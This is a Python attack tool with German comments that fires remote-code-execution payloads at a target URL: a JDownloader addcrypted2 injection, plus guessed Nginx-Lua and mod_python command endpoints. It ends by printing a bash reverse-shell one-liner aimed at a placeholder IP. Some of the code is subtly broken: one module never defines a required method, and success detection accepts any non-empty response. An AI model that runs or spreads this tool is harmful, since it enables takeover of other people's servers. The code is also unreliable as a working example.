#!/usr/bin/env python3
# rce_framework.py
# Modulares RCE-Framework für klassische "offene Endpoint"-Lücken (2025 Edition)
# NUR für autorisierte Tests!

import requests
import argparse
import urllib.parse
import sys
from abc import ABC, abstractmethod

requests.packages.urllib3.disable_warnings()

class bcolors:
    OK = '\033[92m'
    FAIL = '\033[91m'
    WARN = '\033[93m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'

class RCEModule(ABC):
    name = "Generic"
    endpoints = []

    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")

    @abstractmethod
    def build_payload(self, cmd):
        pass

    @abstractmethod
    def send(self, cmd):
        pass

    def detect(self):
        print(f"[{bcolors.WARN}*{bcolors.ENDC}] Prüfe {self.name}...")
        for path in self.endpoints:
            url = f"{self.base_url}{path}"
            try:
                r = requests.get(url, timeout=5, verify=False, allow_redirects=True)
                if r.status_code in (200, 400, 500) and ("uid=" in r.text or "gid=" in r.text or len(r.text) > 0):
                    print(f"{bcolors.OK}[+] {self.name} ERFOLGREICH erkannt: {url}{bcolors.ENDC}")
                    return url
            except:
                pass
        return None

    def exploit(self, cmd):
        url = self.detect()
        if not url:
            print(f"{bcolors.FAIL}[-] {self.name} nicht gefunden{bcolors.ENDC}")
            return False
        print(f"{bcolors.OK}[+] Exploite {self.name} → {cmd}{bcolors.ENDC}")
        return self.send(cmd)

# ──────────────────────────────────────────────────────────────
# 1. JDownloader My.JDownloader RCE
# ──────────────────────────────────────────────────────────────
class JDownloaderRCE(RCEModule):
    name = "JDownloader My.JDownloader"
    endpoints = ["/flash/addcrypted2"]

    def build_payload(self, cmd):
        cmd_enc = cmd.replace(" ", "%20")
        return f"jk=pyimport%20os;os.system(\"{cmd_enc}\");f=function%20f2(){{}};&package=xxx&crypted=AAAA&&passwords=aaaa"

    def send(self, cmd):
        url = f"{self.base_url}/flash/addcrypted2"
        payload = self.build_payload(cmd)
        try:
            r = requests.post(url, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10, verify=False)
            print(f"{bcolors.OK}[+] JDownloader Exploit gesendet!{bcolors.ENDC}")
            return True
        except Exception as e:
            print(f"{bcolors.FAIL}[-] Fehler: {e}{bcolors.ENDC}")
            return False

# ──────────────────────────────────────────────────────────────
# 2. Nginx + ngx_http_lua_module (OpenResty) RCE
# ──────────────────────────────────────────────────────────────
class NginxLuaRCE(RCEModule):
    name = "Nginx Lua (OpenResty)"
    endpoints = ["/exec", "/run", "/cmd", "/lua", "/debug", "/test", "/shell", "/admin/lua", "/api/exec"]

    def send(self, cmd):
        for path in self.endpoints:
            url = f"{self.base_url}{path}?cmd={urllib.parse.quote(cmd)}"
            try:
                r = requests.get(url, timeout=8, verify=False)
                if r.status_code == 200:
                    output = r.text.strip()
                    if output:
                        print(f"{bcolors.OK}[+] Ausgabe:{bcolors.ENDC}\n{output}")
                    else:
                        print(f"{bcolors.OK}[+] Befehl ausgeführt (keine Ausgabe){bcolors.ENDC}")
                    return True
            except:
                pass
        print(f"{bcolors.FAIL}[-] Keine Lua-Location hat funktioniert{bcolors.ENDC}")
        return False

# ──────────────────────────────────────────────────────────────
# 3. Apache + mod_python Publisher Handler RCE (historisch, aber lebendig!)
# ──────────────────────────────────────────────────────────────
class ApacheModPythonRCE(RCEModule):
    name = "Apache mod_python Publisher"
    endpoints = ["/", "/index.py", "/test.py", "/admin", "/debug"]

    def build_payload(self, cmd):
        # Klassischer Publisher-Handler: os.system('cmd')
        return {"cmd": cmd}

    def send(self, cmd):
        for path in self.endpoints:
            url = f"{self.base_url}{path}"
            try:
                # Methode 1: POST mit Form-Data
                r = requests.post(url, data=self.build_payload(cmd), timeout=8, verify=False)
                if r.status_code == 200 and ("uid=" in r.text or len(r.text.strip()) > 5):
                    print(f"{bcolors.OK}[+] mod_python RCE erfolgreich!{bcolors.ENDC}")
                    print(r.text.strip())
                    return True

                # Methode 2: GET mit Query-String (manche Konfigs)
                r2 = requests.get(url, params=self.build_payload(cmd), timeout=8, verify=False)
                if "uid=" in r2.text or "root" in r2.text:
                    print(f"{bcolors.OK}[+] mod_python RCE (GET) erfolgreich!{bcolors.ENDC}")
                    print(r2.text.strip())
                    return True
            except:
                pass
        print(f"{bcolors.FAIL}[-] Kein mod_python Publisher gefunden{bcolors.ENDC}")
        return False

# ──────────────────────────────────────────────────────────────
# Hauptprogramm
# ──────────────────────────────────────────────────────────────
def main():
    banner = f"""
{bcolors.BOLD}╔═══════════════════════════════════════════════════════════╗
║               RCE Framework 2025 – Classic Edition        ║
║  JDownloader • Nginx+Lua • Apache mod_python             ║
╚═══════════════════════════════════════════════════════════╝{bcolors.ENDC}
    """
    print(banner)

    parser = argparse.ArgumentParser(description="Modulares RCE-Framework")
    parser.add_argument('-u', '--url', required=True, help='Ziel-URL (z.B. http://192.168.1.100:8080)')
    parser.add_argument('-c', '--cmd', required=True, help='Ausführen (z.B. "id")')
    parser.add_argument('-t', '--type', choices=['all', 'jdownloader', 'nginx-lua', 'apache-python'], default='all',
                        help='Welche Module testen (Standard: alle)')

    args = parser.parse_args()

    modules = []
    if args.type in ['all', 'jdownloader']:
        modules.append(JDownloaderRCE(args.url))
    if args.type in ['all', 'nginx-lua']:
        modules.append(NginxLuaRCE(args.url))
    if args.type in ['all', 'apache-python']:
        modules.append(ApacheModPythonRCE(args.url))

    print(f"[*] Starte Angriff auf {args.url} → {args.cmd}\n")

    for module in modules:
        module.exploit(args.cmd)
        print("-" * 60)

    # Bonus: Reverse Shell One-Liner (Bash)
    print(f"\n{bcolors.WARN}Reverse Shell One-Liner (für Lua/JDownloader):{bcolors.ENDC}")
    rev = f"bash -c 'bash -i >& /dev/tcp/DEINE_IP/4444 0>&1'"
    print(f"→ {rev}")

if __name__ == "__main__":
    if sys.version_info < (3, 6):
        print(f"{bcolors.FAIL}Python 3.6+ erforderlich!{bcolors.ENDC}")
        sys.exit(1)
    main()
